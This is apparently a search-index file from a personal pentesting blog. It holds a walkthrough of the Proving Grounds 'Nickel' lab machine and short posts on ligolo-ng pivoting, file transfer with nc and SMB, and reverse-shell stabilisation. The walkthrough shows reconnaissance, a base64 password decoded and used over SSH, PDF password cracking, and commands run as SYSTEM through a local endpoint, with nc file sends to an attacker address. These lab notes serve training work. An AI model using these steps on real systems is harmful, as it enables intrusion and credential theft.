var relearn_searchindex = [
  {
    "breadcrumb": "",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Dragonfly Commando",
    "uri": "/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Writeup",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Proving Grounds",
    "uri": "/writeup/proving-grounds/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Writeup \u003e Proving Grounds",
    "content": "Initial foothold Nmap scan PORT STATE SERVICE VERSION 21/tcp open ftp FileZilla ftpd 0.9.60 beta | ftp-syst: |_ SYST: UNIX emulated by FileZilla 22/tcp open ssh OpenSSH for_Windows_8.1 (protocol 2.0) | ssh-hostkey: | 3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA) | 256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA) |_ 256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: NICKEL | NetBIOS_Domain_Name: NICKEL | NetBIOS_Computer_Name: NICKEL | DNS_Domain_Name: nickel | DNS_Computer_Name: nickel | Product_Version: 10.0.18362 |_ System_Time: 2026-02-23T09:53:02+00:00 |_ssl-date: 2026-02-23T09:54:08+00:00; -1s from scanner time. | ssl-cert: Subject: commonName=nickel | Not valid before: 2025-12-06T11:11:21 |_Not valid after: 2026-06-07T11:11:21 5040/tcp open unknown 7680/tcp open pando-pub? 8089/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Site doesn't have a title. 33333/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Site doesn't have a title. 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC Check FTP, SSH, SMB, WEB services.\nEnumeration WEB Access to 8089 port and check a web site.\nThere are three buttons. Check the source code.\nThe links are redirected to port 33333’s endpoints.\nlist-current-deployments list-running-procs list-active-nodes Move on to port 33333 and try curl command to one of endpoints.\ncurl -XPOST http://192.168.168.99:33333/list-active-nodes -H \"Content-Type:application/www-form-urlencoded\" \u003c!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"\"http://www.w3.org/TR/html4/strict.dtd\"\u003e \u003cHTML\u003e\u003cHEAD\u003e\u003cTITLE\u003eLength Required\u003c/TITLE\u003e \u003cMETA HTTP-EQUIV=\"Content-Type\" Content=\"text/html; charset=us-ascii\"\u003e\u003c/HEAD\u003e \u003cBODY\u003e\u003ch2\u003eLength Required\u003c/h2\u003e \u003chr\u003e\u003cp\u003eHTTP Error 411. The request must be chunked or have a content length.\u003c/p\u003e \u003c/BODY\u003e\u003c/HTML\u003e The response says “HTTP Error 411. The request must be chunked or have a content length.”\nAdd content length and try again.\ncurl -XPOST http://192.168.168.99:33333/list-active-nodes -H \"Content-Type:application/www-form-urlencoded\" -H \"Content-Length:6\" \u003cp\u003eNot Implemented\u003c/p\u003e It seems worked. Try other endpoints too.\ncurl -XPOST http://192.168.168.99:33333/list-running-procs -H \"Content-Type:application/www-form-urlencoded\" -H \"Content-Length:6\" name : System Idle Process commandline : name : System commandline : name : Registry commandline : name : smss.exe commandline : name : csrss.exe commandline : name : wininit.exe commandline : name : csrss.exe commandline : name : winlogon.exe commandline : winlogon.exe name : services.exe commandline : name : lsass.exe commandline : C:\\Windows\\system32\\lsass.exe name : fontdrvhost.exe commandline : \"fontdrvhost.exe\" name : fontdrvhost.exe commandline : \"fontdrvhost.exe\" name : dwm.exe commandline : \"dwm.exe\" name : powershell.exe commandline : powershell.exe -nop -ep bypass C:\\windows\\system32\\ws80.ps1 name : Memory Compression commandline : name : cmd.exe commandline : cmd.exe C:\\windows\\system32\\DevTasks.exe --deploy C:\\work\\dev.yaml --user ariah -p \"Tm93aXNlU2xvb3BUaGVvcnkxMzkK\" --server nickel-dev --protocol ssh name : powershell.exe commandline : powershell.exe -nop -ep bypass C:\\windows\\system32\\ws8089.ps1 name : powershell.exe commandline : powershell.exe -nop -ep bypass C:\\windows\\system32\\ws33333.ps1 name : FileZilla Server.exe commandline : \"C:\\Program Files (x86)\\FileZilla Server\\FileZilla Server.exe\" name : sshd.exe commandline : \"C:\\Program Files\\OpenSSH\\OpenSSH-Win64\\sshd.exe\" name : VGAuthService.exe commandline : \"C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe\" name : vm3dservice.exe commandline : C:\\Windows\\system32\\vm3dservice.exe name : vmtoolsd.exe commandline : \"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\" name : vm3dservice.exe commandline : vm3dservice.exe -n name : dllhost.exe commandline : C:\\Windows\\system32\\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235} name : WmiPrvSE.exe commandline : C:\\Windows\\system32\\wbem\\wmiprvse.exe name : msdtc.exe commandline : C:\\Windows\\System32\\msdtc.exe name : LogonUI.exe commandline : \"LogonUI.exe\" /flags:0x2 /state0:0xa3961855 /state1:0x41c64e6d name : conhost.exe commandline : \\??\\C:\\Windows\\system32\\conhost.exe 0x4 name : conhost.exe commandline : \\??\\C:\\Windows\\system32\\conhost.exe 0x4 name : conhost.exe commandline : \\??\\C:\\Windows\\system32\\conhost.exe 0x4 name : conhost.exe commandline : \\??\\C:\\Windows\\system32\\conhost.exe 0x4 name : WmiPrvSE.exe commandline : C:\\Windows\\system32\\wbem\\wmiprvse.exe name : MicrosoftEdgeUpdate.exe commandline : \"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\" /c name : SgrmBroker.exe commandline : name : SearchIndexer.exe commandline : C:\\Windows\\system32\\SearchIndexer.exe /Embedding There’s credential for ssh.\ncmd.exe C:\\windows\\system32\\DevTasks.exe --deploy C:\\work\\dev.yaml --user ariah -p \"Tm93aXNlU2xvb3BUaGVvcnkxMzkK\" --server nickel-dev --protocol ssh\nSSH connection Tm93aXNlU2xvb3BUaGVvcnkxMzkK is base64 decoded password.\necho Tm93aXNlU2xvb3BUaGVvcnkxMzkK | base64 -d NowiseSloopTheory139 ssh ariah@targetIP Privesc Check FTP folder and find a pdf file.\nThe content is locked. Use pdf2john to find the password.\npdf2john infrastructure.pdf \u003e hash john hash --wordlist=/usr/share/wordlists/rockyou.txt ariah4168 The content shows a note about 3 sites.\nThere’s command endpoint.\nWe can do a port-forwarding to access from kali, or we can just check the page directly using curl command from the target terminal.\nariah@NICKEL C:\\Users\\ariah\u003ecurl http://127.0.0.1/?whoami \u003c!doctype html\u003e\u003chtml\u003e\u003cbody\u003edev-api started at 2025-12-07T05:47:35 \u003cpre\u003ent authority\\system \u003c/pre\u003e \u003c/body\u003e\u003c/html\u003e or check it from kali after port forwarding.\nariah@NICKEL C:\\Users\u003essh -N -R 80:127.0.0.1:80 kali@IP Send url encoded command to read proof.txt file.\nOr send a reverse shell payload and execute it as well.",
    "description": "Initial foothold Nmap scan PORT STATE SERVICE VERSION 21/tcp open ftp FileZilla ftpd 0.9.60 beta | ftp-syst: |_ SYST: UNIX emulated by FileZilla 22/tcp open ssh OpenSSH for_Windows_8.1 (protocol 2.0) | ssh-hostkey: | 3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA) | 256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA) |_ 256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: NICKEL | NetBIOS_Domain_Name: NICKEL | NetBIOS_Computer_Name: NICKEL | DNS_Domain_Name: nickel | DNS_Computer_Name: nickel | Product_Version: 10.0.18362 |_ System_Time: 2026-02-23T09:53:02+00:00 |_ssl-date: 2026-02-23T09:54:08+00:00; -1s from scanner time. | ssl-cert: Subject: commonName=nickel | Not valid before: 2025-12-06T11:11:21 |_Not valid after: 2026-06-07T11:11:21 5040/tcp open unknown 7680/tcp open pando-pub? 8089/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Site doesn't have a title. 33333/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Site doesn't have a title. 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC Check FTP, SSH, SMB, WEB services.",
    "tags": [
      "Port-Forwarding"
    ],
    "title": "Nickel Writeup",
    "uri": "/writeup/proving-grounds/nickel/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Port-Forwarding",
    "uri": "/tags/port-forwarding/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tags",
    "uri": "/tags/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Ligolo",
    "uri": "/tags/ligolo/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Posts",
    "content": "ligolo-ng Set a proxy server sudo ./proxy -selfcert -laddr \"0.0.0.0:7878\"\nCreate an interface interface_create --name \"evil-cha\"\nAdd route (Target’s internal network) interface_add_route --name evil-cha --route 10.10.11.0/24\nAccess to the proxy server from the target machine ./agent -connect 10.10.14.3:11601 -ignore-cert\nCheck sessions from the proxy sessoins\nStart tunneling tunnel_start --tun evil-cha\nFor local port forwarding.\nfrom kali terminal sudo ip route add 240.0.0.1/32 dev evil-cha\nor\nfrom ligolo proxy interface interface_add_route --name evil-cha --route 240.0.0.1/32",
    "description": "ligolo-ng Set a proxy server sudo ./proxy -selfcert -laddr \"0.0.0.0:7878\"\nCreate an interface interface_create --name \"evil-cha\"\nAdd route (Target’s internal network) interface_add_route --name evil-cha --route 10.10.11.0/24\nAccess to the proxy server from the target machine ./agent -connect 10.10.14.3:11601 -ignore-cert\nCheck sessions from the proxy sessoins\nStart tunneling tunnel_start --tun evil-cha\nFor local port forwarding.\nfrom kali terminal sudo ip route add 240.0.0.1/32 dev evil-cha",
    "tags": [
      "Ligolo"
    ],
    "title": "Pivoting",
    "uri": "/posts/pivoting/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Posts",
    "uri": "/posts/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Posts",
    "content": "SMB set up SMB server on kali\nimpacket-smbserver test . -smb2support -user user -password 1234\nConnect to the SMB from windows\nnet use Z: \\\\192.168.45.211\\test /user:user 1234\nnc linux file receiver\nnc -lp 1234 \u003e file.txt\nfile sender\nnc -q 0 192.168.45.211 1234 \u003c file.txt\nwindows file receiver\nnc -lp 1234 \u003e file.txt\nfile sender\nnc.exe -w 1 192.168.45.211 1234 \u003c file.txt",
    "description": "SMB set up SMB server on kali\nimpacket-smbserver test . -smb2support -user user -password 1234\nConnect to the SMB from windows\nnet use Z: \\\\192.168.45.211\\test /user:user 1234\nnc linux file receiver",
    "tags": [
      "Smbserver",
      "Nc"
    ],
    "title": "File Transfer",
    "uri": "/posts/file-transfer/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Nc",
    "uri": "/tags/nc/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Smbserver",
    "uri": "/tags/smbserver/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Writeup",
    "uri": "/writeup/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Tags",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Tag :: Reverseshell",
    "uri": "/tags/reverseshell/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando \u003e Posts",
    "content": "After getting a reverse shell, we can stabilize it using commands below.\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' export TERM=xterm ctrl+z stty raw -echo; fg stty rows 38 columns 116",
    "description": "After getting a reverse shell, we can stabilize it using commands below.\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' export TERM=xterm ctrl+z stty raw -echo; fg stty rows 38 columns 116",
    "tags": [
      "Reverseshell"
    ],
    "title": "Stabilize a reverse shell",
    "uri": "/posts/revshell-upgrade/index.html"
  },
  {
    "breadcrumb": "Dragonfly Commando",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Categories",
    "uri": "/categories/index.html"
  }
]
